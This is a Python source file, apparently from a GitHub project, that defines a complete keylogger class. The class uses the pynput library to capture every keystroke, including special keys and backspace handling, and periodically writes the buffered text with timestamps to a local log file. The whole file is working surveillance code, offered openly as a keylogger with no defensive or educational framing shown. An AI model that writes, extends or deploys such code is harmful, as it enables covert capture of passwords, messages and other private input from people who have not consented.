#!/usr/bin/env python3
"""
Keylogger module that captures and logs keyboard input.
Created by: Yash (Popeye) - github.com/yashraut369
"""

import os
import time
import datetime
from pynput import keyboard

class Keylogger:
    """
    A class to implement keylogging functionality.
    Captures keystrokes and writes them to a specified log file.
    """
    
    def __init__(self, log_file="keylog.txt"):
        """
        Initialize the keylogger with the specified log file.
        
        Args:
            log_file (str): The path to the log file where keystrokes will be saved.
        """
        self.log_file = log_file
        self.listener = None
        self._buffer = ""
        self._last_flush_time = time.time()
        self._flush_interval = 10  # Flush buffer to file every 10 seconds
        
        # Create log file if it doesn't exist
        if not os.path.exists(self.log_file):
            with open(self.log_file, 'w') as f:
                f.write(f"Keylogger started at {self._get_timestamp()}\n")
    
    def _get_timestamp(self):
        """Return the current timestamp in a formatted string."""
        return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    def _on_press(self, key):
        """
        Callback function triggered when a key is pressed.
        
        Args:
            key: The key that was pressed.
        """
        try:
            # Handle regular character keys
            if hasattr(key, 'char'):
                if key.char:
                    self._buffer += key.char
            else:
                # Handle special keys
                key_name = str(key).replace("Key.", "")
                if key_name == 'space':
                    self._buffer += " "
                elif key_name == 'enter':
                    self._buffer += "\n"
                elif key_name == 'tab':
                    self._buffer += "\t"
                elif key_name == 'backspace':
                    if self._buffer:
                        self._buffer = self._buffer[:-1]
                else:
                    self._buffer += f"[{key_name}]"
            
            # Check if it's time to flush the buffer to the log file
            current_time = time.time()
            if current_time - self._last_flush_time >= self._flush_interval:
                self._flush_buffer()
                
        except Exception as e:
            # Log any errors that occur during key processing
            with open(self.log_file, 'a') as f:
                f.write(f"\n[ERROR at {self._get_timestamp()}]: {str(e)}\n")
    
    def _flush_buffer(self):
        """Write the current buffer contents to the log file and clear the buffer."""
        if self._buffer:
            with open(self.log_file, 'a') as f:
                f.write(f"\n[{self._get_timestamp()}] Keystrokes: {self._buffer}")
            self._buffer = ""
        self._last_flush_time = time.time()
    
    def start(self):
        """Start the keylogger."""
        # Create keyboard listener with the press callback
        self.listener = keyboard.Listener(on_press=self._on_press)
        self.listener.start()
        self.listener.join()  # Keep the listener alive
    
    def stop(self):
        """Stop the keylogger and flush any remaining buffer content."""
        if self.listener:
            self.listener.stop()
        self._flush_buffer()
        with open(self.log_file, 'a') as f:
            f.write(f"\nKeylogger stopped at {self._get_timestamp()}\n")
